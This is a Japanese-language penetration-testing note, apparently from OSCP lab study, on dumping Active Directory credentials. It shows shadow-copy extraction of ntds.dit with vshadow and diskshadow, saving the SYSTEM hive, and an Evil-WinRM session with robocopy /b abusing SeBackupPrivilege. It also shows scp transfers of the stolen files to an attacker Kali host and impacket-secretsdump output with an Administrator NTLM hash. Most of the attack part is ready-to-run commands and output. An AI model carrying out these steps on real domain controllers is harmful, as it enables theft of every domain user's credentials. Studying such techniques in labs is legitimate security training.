# 攻撃の概要
- ドメイン管理者は、vshadow ユーティリティを使用してシャドウコピーを作成し、Active Directory データベースの NTDS.dit データベースファイルを抽出できる
- データベースのコピーを取得したら、SYSTEM ハイブを使用して、ローカルの Kali マシン上ですべてのユーザー認証情報をオフラインで抽出できる

# 攻撃の流れ
## シャドウコピーの作成
#DC1
- ドメイン管理者としてログイン
- 管理者権限のコマンドプロンプトを立ち上げる

```cmd
vshadow.exe -nw -p  C:
```

```
- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```
![](Assets/Images/Pasted%20image%2020260502093840.png)
*シャドウ コピー デバイス名をメモしておく*

## シャドウコピーをCドライブにコピー
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
![](Assets/Images/Pasted%20image%2020260502093835.png)
## WindowsレジストリからSYSTEMハイブを保存する
```cmd
reg.exe save hklm\system c:\system.bak
```
![](Assets/Images/Pasted%20image%2020260502093822.png)
## 2つの.bakファイルをKaliに送信
```cmd
scp system.bak kali@192.168.45.181:/home/kali/

scp ntds.dit.bak kali@192.168.45.181:/home/kali/
```
![](Assets/Images/Pasted%20image%2020260502093811.png)

![](Assets/Images/Pasted%20image%2020260502093808.png)

## パスワードハッシュ解析
```zsh
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
```
![](Assets/Images/Pasted%20image%2020260502093802.png)

---
# ドメイン管理者権限がない場合
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
以下の権限は有効
- SeBackupPrivilege
- SeRestorePrivilege
```zsh
nano raj.dsh 
```
raj.dsh
```
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
unix2dos raj.dsh
```

```zsh
unix2dos raj.dsh
```

```powershell
*Evil-WinRM* PS C:\Users\jackie\Documents> cd c:\Temp
*Evil-WinRM* PS C:\Temp> ls
*Evil-WinRM* PS C:\Temp> upload raj.dsh
                                        
Info: Uploading /home/kali/OffSec/PEN-200_OSCP+/ChallengeLab/Poseidon/raj.dsh to C:\Temp\raj.dsh
                                        
Data: 136 bytes of 136 bytes copied
                                        
Info: Upload successful!
```

```powershell
*Evil-WinRM* PS C:\Temp> diskshadow /s raj.dsh
```

```powershell
*Evil-WinRM* PS C:\Temp> ls
    Directory: C:\Temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/4/2025   3:17 PM            612 2025-09-04_15-17-08_DC02.cab
-a----         9/4/2025   3:16 PM            102 raj.dsh

*Evil-WinRM* PS C:\Temp> robocopy /b z:\windows\ntds . ntds.dit
```

```powershell
*Evil-WinRM* PS C:\Temp> ls


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/4/2025   3:17 PM            612 2025-09-04_15-17-08_DC02.cab
-a----        2/20/2025  10:23 PM       25165824 ntds.dit
-a----         9/4/2025   3:16 PM            102 raj.dsh

*Evil-WinRM* PS C:\Temp> download ntds.dit
                                        
Info: Downloading C:\Temp\ntds.dit to ntds.dit
                                        
Info: Download successful!

```
![](Assets/Images/Pasted%20image%2020260502093747.png)
```zsh
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```
